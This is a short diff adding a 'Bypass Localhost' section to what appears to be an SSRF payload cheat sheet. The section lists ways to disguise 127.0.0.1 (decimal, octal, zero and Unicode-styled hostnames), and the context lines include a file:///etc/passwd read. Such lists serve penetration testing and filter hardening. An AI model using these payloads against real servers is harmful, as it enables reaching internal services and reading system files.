@@ -11,5 +11,14 @@ Server-side request forgery is a web security vulnerability that allows an attac
 http ==> http://localhost/secretfile.txt
 https ==> https://localhost/secretfile.txt
 file ==> file:///etc/passwd
-
+```
+**Bypass Localhost**
+```
+127.0.0.*
+0.0.0.0
+localhost
+http://2130706433/ (decimal value)]
+http://0177.0.0.1/
+http://0/
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ (Magic Font)
 ```
